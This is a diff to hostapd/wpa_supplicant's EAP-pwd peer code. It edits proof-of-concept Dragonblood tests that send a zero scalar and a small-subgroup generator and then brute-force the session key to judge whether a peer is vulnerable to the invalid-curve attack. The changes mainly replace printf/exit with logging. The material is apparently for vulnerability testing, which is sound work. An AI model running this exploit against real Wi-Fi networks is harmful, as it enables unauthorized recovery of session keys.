@@ -17,6 +17,10 @@
 #include "eap_peer/eap_i.h"
 #include "eap_common/eap_pwd_common.h"
 
+#ifdef DRAGONBLOOD_TESTS
+#include "eapol_supp/eapol_supp_sm.h"
+#endif // DRAGONBLOOD_TESTS
+
 #include "common/attacks.h"
 
 struct eap_pwd_data {
@@ -575,7 +579,7 @@ eap_pwd_perform_commit_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
 		goto fin;
 	}
 
-	printf("\n>>> %s: setting scalar to zero\n\n", __FUNCTION__);
+	poc_log(eapol_sm_get_addr(sm->eapol_ctx), "sending a scalar equal to zero\n");
 #endif // DRAGONBLOOD_TESTS
 
 	if (crypto_ec_point_mul(data->grp->group, data->grp->pwe, mask,
@@ -699,18 +703,17 @@ eap_pwd_perform_commit_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
 	if (data->subgroup == NULL) {
 		data->subgroup = crypto_ec_subgroup(&data->subgroup_generator);
 		if (data->subgroup == NULL) {
-			printf(">>> Error retrieving subgroup parameters!\n");
+			poc_log(eapol_sm_get_addr(sm->eapol_ctx), "ERROR: failed to initialize subgroup parameters!\n");
 			exit(1);
 		}
-		printf(">>> Successfully configured subgroup!\n");
 	}
 
 	if (crypto_ec_point_to_bin(data->subgroup, data->subgroup_generator, element,
 				   element + prime_len) != 0) {
-		printf(">>> subgroup assignment failed!\n");
+		poc_log(eapol_sm_get_addr(sm->eapol_ctx), "ERROR: subgroup generator assignment failed!\n");
 		exit(1);
 	}
-	printf(">>> Successfully assigned subgroup generator!\n");
+	poc_log(eapol_sm_get_addr(sm->eapol_ctx), "sending generator of small subgroup as the element\n");
 #endif // DRAGONBLOOD_TESTS
 
 	/* we send the element as (x,y) follwed by the scalar */
@@ -963,6 +966,8 @@ eap_pwd_perform_confirm_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
 	struct crypto_bignum *bignum_rand = crypto_bignum_init();
 	struct crypto_bignum *k_xcoord = crypto_bignum_init();
 
+	poc_log(eapol_sm_get_addr(sm->eapol_ctx), "trying to recover session key..\n");
+
 	peer_rand = 1;
 	while (peer_rand < 269)
 	{
@@ -983,16 +988,16 @@ eap_pwd_perform_confirm_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
 
 		/* Replace the secret key k with a result from the subgroup calculation */
 		if (crypto_bignum_setint(bignum_rand, peer_rand)) {
-			printf(">>> %s: converting peer_rand to bignum failed\n", __FUNCTION__);
-			exit(1);
+			poc_log(eapol_sm_get_addr(sm->eapol_ctx), "ERROR: %s: converting peer_rand to bignum failed\n", __FUNCTION__);
+			goto fin;
 		}
 		if (crypto_ec_point_mul(data->subgroup, data->subgroup_generator, bignum_rand, point_k)) {
-			printf(">>> %s: point multiplication failed\n", __FUNCTION__);
-			exit(1);
+			poc_log(eapol_sm_get_addr(sm->eapol_ctx), "ERROR: %s: point multiplication failed\n", __FUNCTION__);
+			goto fin;
 		}
 		if (crypto_ec_point_x(data->subgroup, point_k, k_xcoord)) {
-			printf(">>> %s: failed to get X-coordinate of k\n", __FUNCTION__);
-			exit(1);
+			poc_log(eapol_sm_get_addr(sm->eapol_ctx), "ERROR: %s: failed to get X-coordinate of k\n", __FUNCTION__);
+			goto fin;
 		}
 		crypto_bignum_to_bin(k_xcoord, cruft, prime_len, prime_len);
 
@@ -1014,10 +1019,9 @@ eap_pwd_perform_confirm_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
 		/* my element was the generator of the subgroup */
 		if (crypto_ec_point_to_bin(data->subgroup, data->subgroup_generator, cruft,
 					   cruft + prime_len) != 0) {
-			printf(">>> %s: failed to force invalid curve point\n", __FUNCTION__);
-			exit(1);
+			poc_log(eapol_sm_get_addr(sm->eapol_ctx), "ERROR: %s: failed to force invalid curve point\n", __FUNCTION__);
+			goto fin;
 		}
-		printf("\n>>> %s: set invalid EC point\n\n", __FUNCTION__);
 
 		eap_pwd_h_update(hash, cruft, prime_len * 2);
 
@@ -1041,12 +1045,12 @@ eap_pwd_perform_confirm_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
 	}
 
 	if (peer_rand > 269) {
-		printf(">>> %s: FAILED TO RECOVER SESSION KEY!\n", __FUNCTION__);
-		exit(1);
-		//goto fin;
+		poc_log(eapol_sm_get_addr(sm->eapol_ctx), "failed to recover session key. Peer may not be vulnerable?\n");
+		goto fin;
 	}
 
 	wpa_printf(MSG_DEBUG, "EAP-pwd (peer): confirm verified");
+	poc_log(eapol_sm_get_addr(sm->eapol_ctx), "successfully recovered the session key. Peer is vulnerable to invalid curve attack!\n");
 
 	// Set the recovered session key !!
 	data->k = k_xcoord;
@@ -1069,10 +1073,9 @@ eap_pwd_perform_confirm_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
 	/* my element was the generator of the subgroup */
 	if (crypto_ec_point_to_bin(data->subgroup, data->subgroup_generator, cruft,
 				   cruft + prime_len) != 0) {
-		printf(">>> %s: failed to force invalid curve point\n", __FUNCTION__);
-		exit(1);
+		poc_log(eapol_sm_get_addr(sm->eapol_ctx), "ERROR: %s: failed to force invalid curve point\n", __FUNCTION__);
+		goto fin;
 	}
-	printf("\n>>> %s: set invalid EC point\n\n", __FUNCTION__);
 
 	eap_pwd_h_update(hash, cruft, prime_len * 2);
 
